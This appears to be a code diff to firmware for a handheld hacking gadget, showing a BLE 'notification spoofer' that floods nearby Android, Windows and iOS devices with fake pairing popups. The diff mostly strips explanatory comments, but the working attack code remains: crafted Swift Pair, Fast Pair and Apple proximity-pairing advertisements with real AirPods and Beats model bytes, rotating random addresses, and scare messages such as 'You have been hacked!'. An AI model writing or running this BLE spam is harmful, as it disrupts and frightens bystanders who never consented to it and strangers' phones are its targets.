@@ -1,9 +1,3 @@
-// ═══════════════════════════════════════════════════════════
-// Arsenal - SMS-style Notification Spoofer
-// Pushes fake notifications to nearby Android devices via BLE
-// Uses the BLE notification service advertisement pattern
-// ═══════════════════════════════════════════════════════════
-
 #include "arsenal.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
@@ -13,10 +7,10 @@
 #include <BLEUtils.h>
 #include <globals.h>
 
-// NimBLE random address function
+
 extern "C" int ble_hs_id_set_rnd(const uint8_t *rnd_addr);
 
-// Predefined notification messages
+
 static const char *NOTIF_MESSAGES[] = {
     "You have been hacked!",
     "Your WiFi password is exposed",
@@ -31,10 +25,9 @@ static const char *NOTIF_MESSAGES[] = {
 };
 static const int NUM_MESSAGES = sizeof(NOTIF_MESSAGES) / sizeof(NOTIF_MESSAGES[0]);
 
-// BLE GATT notification services
-// Apple Notification Center Service (ANCS) UUID
+
 #define ANCS_SERVICE_UUID "7905F431-B5CE-4E99-A40F-4B1E122D00D0"
-// Notification Source Characteristic
+
 #define NOTIF_SOURCE_UUID "9FBF120D-6301-42D9-8C58-25E699A21DBD"
 
 static BLEServer *pServer = nullptr;
@@ -42,18 +35,17 @@ static BLECharacteristic *pNotifChar = nullptr;
 static int notifsSent = 0;
 static bool serverActive = false;
 
-// Microsoft Swift Pair - makes Windows devices show "New device found" popup
+
 static void sendSwiftPairSpam(BLEAdvertising *adv) {
     BLEAdvertisementData advData;
 
-    // Microsoft Swift Pair beacon
-    // Vendor specific: Microsoft company ID (0x0006)
+
     String mfgData = "";
-    mfgData += (char)0x06;  // Microsoft company ID low
-    mfgData += (char)0x00;  // Microsoft company ID high
-    mfgData += (char)0x03;  // Swift Pair scenario
-    mfgData += (char)0x00;  // Reserved
-    // Device name payload (random to make unique devices)
+    mfgData += (char)0x06;
+    mfgData += (char)0x00;
+    mfgData += (char)0x03;
+    mfgData += (char)0x00;
+
     for (int i = 0; i < 6; i++) {
         mfgData += (char)random(256);
     }
@@ -65,16 +57,15 @@ static void sendSwiftPairSpam(BLEAdvertising *adv) {
     adv->setAdvertisementData(advData);
 }
 
-// Google Fast Pair - makes Android devices show "Device nearby" notification
+
 static void sendGoogleFastPair(BLEAdvertising *adv) {
     BLEAdvertisementData advData;
 
-    // Google Fast Pair service data
-    // Service UUID: 0xFE2C
+
     String serviceData = "";
-    serviceData += (char)0x2C;  // Google Fast Pair UUID low
-    serviceData += (char)0xFE;  // Google Fast Pair UUID high
-    // Model ID (random - triggers "device nearby" on Android)
+    serviceData += (char)0x2C;
+    serviceData += (char)0xFE;
+
     for (int i = 0; i < 3; i++) {
         serviceData += (char)random(256);
     }
@@ -85,41 +76,33 @@ static void sendGoogleFastPair(BLEAdvertising *adv) {
     adv->setAdvertisementData(advData);
 }
 
-// Apple BLE Proximity - triggers "AirPods nearby" popup on iOS
+
 static void sendAppleProximityPairing(BLEAdvertising *adv) {
     BLEAdvertisementData advData;
 
-    // Apple company ID: 0x004C
-    // Proximity pairing type: 0x07 (length 0x19)
-    // This triggers the "Not Your AirPods" popup on nearby iPhones
-    String mfgData = "";
-    mfgData += (char)0x4C;  // Apple company ID low
-    mfgData += (char)0x00;  // Apple company ID high
-    mfgData += (char)0x07;  // Proximity pairing type
-    mfgData += (char)0x19;  // Length
-    mfgData += (char)0x07;  // Status (prefix byte)
 
-    // Device model bytes (different values = different device popups)
-    // Known models:
-    //   0x0220 = AirPods Pro
-    //   0x0E20 = AirPods (3rd gen)
-    //   0x0A20 = AirPods Max
-    //   0x1420 = AirPods Pro 2
-    //   0x0320 = Powerbeats Pro
+    String mfgData = "";
+    mfgData += (char)0x4C;
+    mfgData += (char)0x00;
+    mfgData += (char)0x07;
+    mfgData += (char)0x19;
+    mfgData += (char)0x07;
+
+
     static const uint8_t models[][2] = {
-        {0x02, 0x20},  // AirPods Pro
-        {0x0E, 0x20},  // AirPods 3rd gen
-        {0x0A, 0x20},  // AirPods Max
-        {0x14, 0x20},  // AirPods Pro 2
-        {0x03, 0x20},  // Powerbeats Pro
-        {0x12, 0x20},  // Beats Fit Pro
-        {0x10, 0x20},  // Beats Flex
+        {0x02, 0x20},
+        {0x0E, 0x20},
+        {0x0A, 0x20},
+        {0x14, 0x20},
+        {0x03, 0x20},
+        {0x12, 0x20},
+        {0x10, 0x20},
     };
     int modelIdx = random(7);
     mfgData += (char)models[modelIdx][0];
     mfgData += (char)models[modelIdx][1];
 
-    // Fill remaining bytes with random data
+
     for (int i = 0; i < 22; i++) {
         mfgData += (char)random(256);
     }
@@ -134,7 +117,7 @@ void arsenal_sms_notification_spoofer(void) {
     ARSENAL_SAFE_RUN([]() {
         notifsSent = 0;
 
-        // Select mode
+
         options.clear();
         int mode = -1;
         options.push_back({"Android (Fast Pair)", [&mode]() { mode = 0; }});
@@ -152,13 +135,13 @@ void arsenal_sms_notification_spoofer(void) {
         unsigned long startTime = millis();
 
         while (true) {
-            // Randomize BLE address for each advertisement
+
             uint8_t addr[6];
             for (int i = 0; i < 6; i++) addr[i] = random(256);
-            addr[0] |= 0xC0;  // random static
+            addr[0] |= 0xC0;
             ble_hs_id_set_rnd(addr);
 
-            // Send appropriate spam type
+
             if (mode == 0 || (mode == 2 && notifsSent % 3 == 0)) {
                 sendGoogleFastPair(pAdvertising);
             }
@@ -174,7 +157,7 @@ void arsenal_sms_notification_spoofer(void) {
             pAdvertising->stop();
             notifsSent++;
 
-            // Draw UI every 10 packets
+
             if (notifsSent % 10 == 0) {
                 drawMainBorderWithTitle("Notif Spoofer");
                 int y = 45;
